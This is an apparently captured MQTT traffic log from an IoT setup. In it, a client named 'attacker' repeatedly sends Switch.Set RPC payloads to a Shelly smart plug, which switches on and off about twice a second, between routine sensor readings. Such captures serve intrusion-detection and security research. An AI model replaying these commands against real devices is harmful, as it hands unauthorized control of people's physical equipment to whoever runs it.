2026-04-22T16:17:19,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33172.30,""swi"
2026-04-22T16:17:19,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:17:19,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3442 33172.325 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:19,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:19,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:20,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3443 33172.806 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:20,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:20,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33172.80,""swi"
2026-04-22T16:17:20,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3444 33172.823 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:20,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:20,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:20,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3445 33173.306 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:20,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:20,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33173.30,""swi"
2026-04-22T16:17:20,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3446 33173.325 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:20,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:20,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:21,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3447 33173.807 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:21,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:21,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33173.80,""swi"
2026-04-22T16:17:21,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3448 33173.824 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:21,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:21,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:21,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3449 33174.308 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:21,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:21,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33174.31,""swi"
2026-04-22T16:17:21,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3450 33174.327 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:21,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:21,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:22,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3451 33174.808 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:22,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:22,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33174.81,""swi"
2026-04-22T16:17:22,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3452 33174.825 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:22,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:22,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:22,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3453 33175.310 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:22,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:22,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33175.31,""swi"
2026-04-22T16:17:22,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3454 33175.328 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:22,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:22,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:23,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3455 33175.814 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:23,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:23,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33175.81,""swi"
2026-04-22T16:17:23,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3456 33175.830 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:23,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:23,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:23,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3457 33176.310 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:23,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:23,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33176.31,""swi"
2026-04-22T16:17:23,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3458 33176.329 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:23,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:23,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:24,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3459 33176.811 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:24,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:24,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33176.81,""swi"
2026-04-22T16:17:24,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3460 33176.827 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:24,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:24,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:24,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3461 33177.311 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:24,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:17:24,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:24,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33177.31,""swi"
2026-04-22T16:17:24,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:17:24,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3462 33177.330 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:24,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:24,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:25,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3463 33177.812 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:25,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:25,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33177.81,""swi"
2026-04-22T16:17:25,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3464 33177.828 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:25,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:25,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:25,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3465 33178.312 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:25,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:25,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33178.31,""swi"
2026-04-22T16:17:25,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3466 33178.331 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:25,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:25,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:26,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3467 33178.813 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:26,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:26,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33178.81,""swi"
2026-04-22T16:17:26,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3468 33178.829 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:26,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:17:26,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:17:26,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:17:26,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:17:26,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:17:26,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:26,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:26,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3469 33179.316 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:26,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:26,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33179.31,""swi"
2026-04-22T16:17:26,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3470 33179.335 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:26,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:26,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:27,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3471 33179.820 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:27,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:27,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33179.82,""swi"
2026-04-22T16:17:27,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3472 33179.837 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:27,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:27,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:27,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3473 33180.324 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:27,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:27,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33180.32,""swi"
2026-04-22T16:17:27,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3474 33180.343 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:27,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:27,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:28,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3475 33180.824 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:28,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:28,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33180.82,""swi"
2026-04-22T16:17:28,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3476 33180.840 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:28,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:28,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:28,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3477 33181.326 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:28,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:28,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33181.32,""swi"
2026-04-22T16:17:28,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3478 33181.345 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:28,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:28,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:29,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3479 33181.825 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:29,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:29,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33181.82,""swi"
2026-04-22T16:17:29,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3480 33181.842 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:29,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:29,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:29,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:17:29,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:17:29,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3481 33182.325 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:29,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:29,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33182.32,""swi"
2026-04-22T16:17:29,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3482 33182.345 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:29,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:29,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:30,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3483 33182.826 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:30,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:30,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33182.82,""swi"
2026-04-22T16:17:30,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3484 33182.842 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:30,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:30,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:30,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3485 33183.327 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:30,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:30,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33183.32,""swi"
2026-04-22T16:17:30,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3486 33183.345 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:30,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:31,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:31,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3487 33183.827 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:31,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:31,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33183.82,""swi"
2026-04-22T16:17:31,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3488 33183.843 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:31,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:31,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:31,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3489 33184.327 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:31,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:31,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33184.32,""swi"
2026-04-22T16:17:31,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3490 33184.346 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:31,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:32,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:32,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3491 33184.828 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:32,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:32,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33184.82,""swi"
2026-04-22T16:17:32,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3492 33184.844 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:32,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:32,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:32,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3493 33185.330 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:32,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:32,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33185.33,""swi"
